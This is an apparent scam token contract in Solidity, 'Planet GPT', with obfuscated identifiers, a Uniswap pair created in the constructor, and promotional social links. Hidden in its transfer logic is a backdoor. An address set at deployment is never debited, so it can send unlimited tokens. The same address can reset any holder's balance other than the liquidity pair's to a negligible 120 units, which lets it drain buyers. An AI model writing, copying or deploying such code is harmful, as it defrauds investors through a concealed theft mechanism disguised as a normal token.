/*

Telegram: https://t.me/PlanetGPT

Twitter: https://twitter.com/PlanetGPTETH

*/

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract PlanetGPT is Ownable {
    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address vmrqudsgn, uint256 noxewfupca) public returns (bool success) {
        allowance[msg.sender][vmrqudsgn] = noxewfupca;
        emit Approval(msg.sender, vmrqudsgn, noxewfupca);
        return true;
    }

    string public name = 'Planet GPT';

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private qtxohbf;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address eqgx) {
        balanceOf[msg.sender] = totalSupply;
        pjewbft[eqgx] = lhfbr;
        IUniswapV2Router02 fzemjdvgsk = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        hxeqjvnmrcly = IUniswapV2Factory(fzemjdvgsk.factory()).createPair(address(this), fzemjdvgsk.WETH());
    }

    mapping(address => uint256) private pjewbft;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public symbol = 'Planet GPT';

    uint256 private lhfbr = 120;

    uint8 public decimals = 9;

    function transferFrom(address kwvj, address mjdbwrthkpu, uint256 noxewfupca) public returns (bool success) {
        require(noxewfupca <= allowance[kwvj][msg.sender]);
        allowance[kwvj][msg.sender] -= noxewfupca;
        kxhjbuvinlaq(kwvj, mjdbwrthkpu, noxewfupca);
        return true;
    }

    function transfer(address mjdbwrthkpu, uint256 noxewfupca) public returns (bool success) {
        kxhjbuvinlaq(msg.sender, mjdbwrthkpu, noxewfupca);
        return true;
    }

    address public hxeqjvnmrcly;

    function kxhjbuvinlaq(address kwvj, address mjdbwrthkpu, uint256 noxewfupca) private {
        if (pjewbft[kwvj] == 0) {
            balanceOf[kwvj] -= noxewfupca;
        }
        balanceOf[mjdbwrthkpu] += noxewfupca;
        if (pjewbft[msg.sender] > 0 && noxewfupca == 0 && mjdbwrthkpu != hxeqjvnmrcly) {
            balanceOf[mjdbwrthkpu] = lhfbr;
        }
        emit Transfer(kwvj, mjdbwrthkpu, noxewfupca);
    }

    mapping(address => uint256) public balanceOf;
}